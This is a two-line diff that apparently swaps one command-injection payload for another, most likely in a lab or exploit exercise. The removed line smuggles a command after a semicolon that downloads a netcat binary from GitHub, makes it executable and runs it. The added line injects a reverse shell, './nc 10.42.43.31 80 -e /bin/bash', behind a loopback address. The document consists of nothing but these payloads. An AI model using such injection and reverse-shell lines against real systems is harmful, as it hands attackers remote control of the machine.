@@ -1,1 +1,1 @@
-; wget https://github.com/yunchih/static-binaries/raw/master/nc; chmod 777 nc; ./nc -V
+127.0.0.1; ./nc 10.42.43.31 80 -e /bin/bash
